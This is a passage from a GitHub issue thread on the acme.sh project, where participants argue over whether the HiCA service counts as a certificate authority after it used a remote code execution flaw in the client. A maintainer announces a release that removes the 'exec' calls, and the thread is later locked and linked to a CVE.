| Hey, um, this is the acme.sh bug tracker. This bug is about an RCE in acme.sh, and possibly there are other places in the code with the same issue. Can we please keep the discussion on that rather than some random CA that just happened to exploit this RCE? The CA is not the problem in this bug (take this to the CA forum), but the defect in the code is.  Personally, I’m not using this CA, but am now getting spammed for this because people abuse this bug to talk about some CA rather than the bug - and I guess a lot of others are in the same situation as I. Use the correct venue please.  [@LeviMarvin](https://github.com/LeviMarvin) [@xiaohuilam](https://github.com/xiaohuilam) Please see the above request of Midar. I'm 100% with him. This issue is really not for discussion about the CA in question, but for the bug in acme.sh. I'd gladly like to request discussing in private about that issue if needs arise, and stop spamming my inbox about whether the CA is now a CA or not.  Thanks. |
| --- |

 👍
3
 ras52, DejavuMoe, and LeviMarvin reacted with thumbs up emoji

All reactions

* 👍
  3 reactions

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584535248)

| [@xiaohuilam](https://github.com/xiaohuilam) As of now, you have not given a formal explanation (including the reasons for doing so) on "using the ACME client for commercial activities", but continue to quibble in this issue. At the same time, you said that the HiCA server has been shut down, and some traffic is redirected to the White House page because of WAF operation. Why do you (and your company) configure this WAF rule? It is even more scandalous if traffic is directed to a third-party site just to prevent DDos attacks. |
| --- |

 👍
1
 Mosney reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584537108) • edited Loading

| [@xiaohuilam](https://github.com/xiaohuilam) Your company (or your CA's company) is registered in China, the code of company is `91500108MAACDXG09T` and contact phone number is `+86 17099911119`, contact mail is `sslcertificate@foxmail.com`/`contact@xunsign.com`. your official website `www1.hi.cn` have not used the certificate signed from your own CA. Your company is selling of prepare to sell PKI services after permitted by government. So we have reason believe that your are an CA.  We're not a CA, we have no public key infrastructures including public CA or private CA. And a kind remind, submitting information here such as telephone、addresses that not evidence without our consent will violate China citizen privacy.  All of information is published by yourself (or your company-self) to public. This is mandatory under Chinese law and does not violate your privacy. All of information can be accessed from anywhere and not need to be authoried publish. This is in line with Chinese law. All information is voluntarily disclosed by the company, and there is no need to declare it separately on the company's official website. If you don't want to, I can provide the URL of the China National Enterprise Credit Information Publicity System for your own reference. |
| --- |

 👍
3
 bunnyblueair, LeviMarvin, and Mosney reacted with thumbs up emoji

All reactions

* 👍
  3 reactions

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584539243)

| [@boomer41](https://github.com/boomer41) Of course. |
| --- |

 👍
2
 boomer41 and LeviMarvin reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584540452)

| [@xiaohuilam](https://github.com/xiaohuilam) As of now, you have not given a formal explanation (including the reasons for doing so) on "using the ACME client for commercial activities", but continue to quibble in this issue. At the same time, you said that the HiCA server has been shut down, and some traffic is redirected to the White House page because of WAF operation. Why do you (and your company) configure this WAF rule? It is even more scandalous if traffic is directed to a third-party site just to prevent DDos attacks.  Commercialization abilities is the QRCode output part, which isn't the RCE. it has no security concern. (No potential risks to local server actually, and how to category the QRCode outputs if you are a CVE reviewer?) |
| --- |

 👎
2
 bunnyblueair and LeviMarvin reacted with thumbs down emoji

All reactions

* 👎
  2 reactions

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584541532) • edited Loading

| [@xiaohuilam](https://github.com/xiaohuilam) Your company (or your CA's company) is registered in China, the code of company is `91500108MAACDXG09T` and contact phone number is `+86 17099911119`, contact mail is `sslcertificate@foxmail.com`/`contact@xunsign.com`. your official website `www1.hi.cn` have not used the certificate signed from your own CA. Your company is selling of prepare to sell PKI services after permitted by government. So we have reason believe that your are an CA.  We're not a CA, we have no public key infrastructures including public CA or private CA. And a kind remind, submitting information here such as telephone、addresses that not evidence without our consent will violate China citizen privacy.  All of informations is published by yourself (or your company-self) to public. This is mandatory under Chinese law and does not violate your privacy.  But it's on our site, we never authorized you to disclosure anywhere else.  Even we published our photo on our website, we reserves all the copyright and privacy. But you shared at social media this is totally violate for them. |
| --- |

 👎
5
 bunnyblueair, byhemechi, boomer41, andrewnicolalde, and LeviMarvin reacted with thumbs down emoji
 😄
5
 byhemechi, boomer41, iammeken, andrewnicolalde, and Mosney reacted with laugh emoji

All reactions

* 👎
  5 reactions
* 😄
  5 reactions

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584546150)

| [@xiaohuilam](https://github.com/xiaohuilam) If you are not a CA, you have NOT ANY reasons to sell the certificate or publish the payment information with ACME users. And in your website, you said "We provide OCSP in China Mainland", how did you do that? The OCSP services must be operated by CA.   * Q: We provide OCSP in China Mainland * A: We are a SSL.com partner co operated a intermediate CA which hosts ocsp responder in China. And also sometimes we redirects cert provider to GTS(Google Trust Services), it hosts ocsp.pki.goog which has ocsp responder datacenter in China. So this isn't the evidence to proof HiCA is a CA which managed PKI. |
| --- |

All reactions

Sorry, something went wrong.

[![@Scirese](https://avatars.githubusercontent.com/u/62688390?s=80&u=9f1df8e71e5c30fab6391455dbc1fbaa7fea2881&v=4)](/Scirese)

Copy link

### **[Scirese](/Scirese)** commented [Jun 9, 2023](#issuecomment-1584549830)

| [@Neilpang](https://github.com/Neilpang) The discussion is completely heading to off-topic and heated, we should lock the issue now |
| --- |

 👍
3
 mritzmann, xiaohuilam, and ramonacat reacted with thumbs up emoji

All reactions

* 👍
  3 reactions

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584552155)

| We should start a new issue to disscusion the bug about ACME. HiCA's problem will be reported to CA/B. |
| --- |

 👍
4
 LeviMarvin, mweinelt, bunnyblueair, and Mosney reacted with thumbs up emoji

All reactions

* 👍
  4 reactions

Sorry, something went wrong.

[![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=80&v=4)](/Neilpang)

Copy link

Member

### **[Neilpang](/Neilpang)** commented [Jun 9, 2023](#issuecomment-1584561604) • edited Loading

| sorry guys, new release is out. <https://github.com/acmesh-official/acme.sh/releases>  All the "exec" are removed, that was originally added for a better display of the error message.  If you have any more bugs found, please let me know. |
| --- |

 👍
4
 dconry, xiaohuilam, Mosney, and LeviMarvin reacted with thumbs up emoji

All reactions

* 👍
  4 reactions

Sorry, something went wrong.

[![@acmesh-official](https://avatars.githubusercontent.com/u/60454762?s=40&v=4)](/acmesh-official)
[acmesh-official](/acmesh-official)
locked as **off-topic** and limited conversation to collaborators
[Jun 9, 2023](#event-9484432007)

[![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=80&v=4)](/Neilpang)

Copy link

Member

### **[Neilpang](/Neilpang)** commented [Jul 14, 2023](#issuecomment-1635110068)

| someone created a CVE: <https://www.cve.org/CVERecord?id=CVE-2023-38198> |
| --- |

All reactions

Sorry, something went wrong.

[![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=40&v=4)](/Neilpang)
[Neilpang](/Neilpang)
closed this as [completed](/acmesh-official/acme.sh/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Jul 14, 2023](#event-9816739452)

[Sign up for free](/join?source=comment-repo)
**to subscribe to this conversation on GitHub**.
Already have an account?
[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Facmesh-official%2Facme.sh%2Fissues%2F4659).

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

21 participants

[![@mikma](https://avatars.githubusercontent.com/u/56008?s=52&v=4)](/mikma) [![@Finkregh](https://avatars.githubusercontent.com/u/518090?s=52&v=4)](/Finkregh) [![@Midar](https://avatars.githubusercontent.com/u/752237?s=52&v=4)](/Midar) [![@mholt](https://avatars.githubusercontent.com/u/1128849?s=52&v=4)](/mholt) [![@aaomidi](https://avatars.githubusercontent.com/u/1465785?s=52&v=4)](/aaomidi) [![@jdkasten](https://avatars.githubusercontent.com/u/1581662?s=52&v=4)](/jdkasten) [![@j-mie](https://avatars.githubusercontent.com/u/1857320?s=52&v=4)](/j-mie) [![@boomer41](https://avatars.githubusercontent.com/u/1922978?s=52&v=4)](/boomer41) [![@mvdan](https://avatars.githubusercontent.com/u/3576549?s=52&v=4)](/mvdan) [![@komuw](https://avatars.githubusercontent.com/u/5163857?s=52&v=4)](/komuw) [![@shankerwangmiao](https://avatars.githubusercontent.com/u/6825907?s=52&v=4)](/shankerwangmiao) [![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=52&v=4)](/xiaohuilam) [![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=52&v=4)](/Neilpang) [![@PPazderski](https://avatars.githubusercontent.com/u/13628240?s=52&v=4)](/PPazderski) [![@Alan-Liang](https://avatars.githubusercontent.com/u/16379418?s=52&v=4)](/Alan-Liang) [![@PhotonQuantum](https://avatars.githubusercontent.com/u/18749973?s=52&v=4)](/PhotonQuantum) [![@qwerzl](https://avatars.githubusercontent.com/u/46770502?s=52&v=4)](/qwerzl) [![@Scirese](https://avatars.githubusercontent.com/u/62688390?s=52&v=4)](/Scirese) [![@iammeken](https://avatars.githubusercontent.com/u/67883286?s=52&v=4)](/iammeken) [![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=52&v=4)](/LeviMarvin) and others

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

